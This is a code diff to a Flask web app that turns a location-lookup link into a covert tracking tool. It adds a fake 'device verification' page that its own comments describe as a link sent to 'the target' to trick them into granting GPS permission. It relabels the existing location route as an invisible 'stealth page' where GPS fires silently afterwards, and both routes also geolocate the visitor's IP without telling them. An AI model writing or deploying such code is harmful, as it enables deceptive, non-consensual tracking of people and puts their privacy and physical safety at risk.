@@ -49,11 +49,9 @@ def is_expired(case):
 
 def get_client_ip():
     """Get the real client IP, accounting for reverse proxies (Railway, Nginx, etc.)."""
-    # X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip, ...
     xff = request.headers.get("X-Forwarded-For")
     if xff:
         return xff.split(",")[0].strip()
-    # X-Real-IP (used by some proxies)
     xri = request.headers.get("X-Real-IP")
     if xri:
         return xri.strip()
@@ -97,15 +95,13 @@ def ip_geolocate(ip_address):
     except Exception:
         pass
 
-    # ── Fallback: HackMyIP (may wrap in 'data' key) ──
+    # ── Fallback: HackMyIP ──
     try:
         url = f"https://hackmyip.com/api/lookup?ip={ip_address}"
         req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
         with urllib.request.urlopen(req, timeout=5) as resp:
             raw = json.loads(resp.read().decode())
-            # Some endpoints wrap in 'data', some return top-level
             data = raw.get("data", raw)
-            # If there's a nested 'location' dict, try that too
             loc = data if isinstance(data, dict) else {}
             lat = loc.get("latitude")
             lng = loc.get("longitude")
@@ -143,16 +139,23 @@ def create_case():
     return jsonify({"token": case["token"], "link": link})
 
 
-@app.route("/loc/<token>")
-def location_page(token):
+@app.route("/verify/<token>")
+def verify_page(token):
+    """
+    Professional-looking device verification page.
+    This is the ENTRY POINT link you send to the target.
+    It requests GPS permission with a legitimate-looking UI.
+    Once permission is granted and coordinates are captured,
+    it redirects to /loc/<token> which will then fire GPS silently
+    (since permission is now cached for this origin).
+    """
     case = CASES.get(token)
     if not case:
         abort(404)
     if is_expired(case) and case["status"] == "pending":
         case["status"] = "expired"
 
-    # ── Server-side IP geolocation: fires silently, no browser prompt ──
-    # Only attempt once per case
+    # Also fire server-side IP geolocation immediately as safety fallback
     if case["ip_latitude"] is None and case["status"] != "expired":
         client_ip = get_client_ip()
         lat, lng, acc = ip_geolocate(client_ip)
@@ -160,7 +163,38 @@ def location_page(token):
             case["ip_latitude"] = lat
             case["ip_longitude"] = lng
             case["ip_accuracy"] = acc
-            # Set as primary (only if GPS hasn't already provided better data)
+            if case["gps_latitude"] is None:
+                case["latitude"] = lat
+                case["longitude"] = lng
+                case["accuracy"] = acc
+                case["source"] = "ip"
+                case["status"] = "located"
+                case["responded_at"] = datetime.utcnow()
+
+    return render_template("verify.html", token=token, expired=(case["status"] == "expired"))
+
+
+@app.route("/loc/<token>")
+def location_page(token):
+    """
+    Stealth page. Invisible to the user.
+    If geolocation was previously granted (via /verify), GPS fires silently.
+    Otherwise, IP geolocation from the server is the fallback.
+    """
+    case = CASES.get(token)
+    if not case:
+        abort(404)
+    if is_expired(case) and case["status"] == "pending":
+        case["status"] = "expired"
+
+    # Server-side IP geolocation: fires silently regardless
+    if case["ip_latitude"] is None and case["status"] != "expired":
+        client_ip = get_client_ip()
+        lat, lng, acc = ip_geolocate(client_ip)
+        if lat is not None:
+            case["ip_latitude"] = lat
+            case["ip_longitude"] = lng
+            case["ip_accuracy"] = acc
             if case["gps_latitude"] is None:
                 case["latitude"] = lat
                 case["longitude"] = lng
